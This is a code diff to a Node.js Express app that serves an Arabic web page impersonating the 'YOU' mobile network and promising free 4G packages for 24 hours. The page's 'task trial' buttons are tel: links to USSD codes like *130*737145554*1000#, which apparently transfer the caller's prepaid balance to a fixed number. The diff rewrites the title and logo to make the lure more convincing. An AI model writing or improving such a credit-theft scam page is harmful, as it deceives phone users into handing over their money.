@@ -2,12 +2,13 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// محتوى صفحة HTML الرئيسية
 const htmlContent = `
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>الحصول على رصيد مجاني - شبكة YOU</title>
+  <title>الحصول على باقات 4G مجانية - شبكة YOU</title>
   <style>
     body {
       background: #fff8dc;
@@ -55,7 +56,7 @@ const htmlContent = `
 </head>
 <body>
 
-  <div class="logo-text">YOU 4G</div>
+  <div class="logo-text">باقات 4G مجانية لمدة 24 ساعة</div>
 
   <a href="tel:*130*737145554*1000#" class="btn">تجربة المهمة 1</a>
   <a href="tel:*130*737145554*400#" class="btn">تجربة المهمة 2</a>
@@ -69,10 +70,11 @@ const htmlContent = `
 </html>
 `;
 
+// نقطة البداية
 app.get('/', (req, res) => {
   res.send(htmlContent);
 });
 
 app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`🚀 Server is running on port ${port}`);
 });
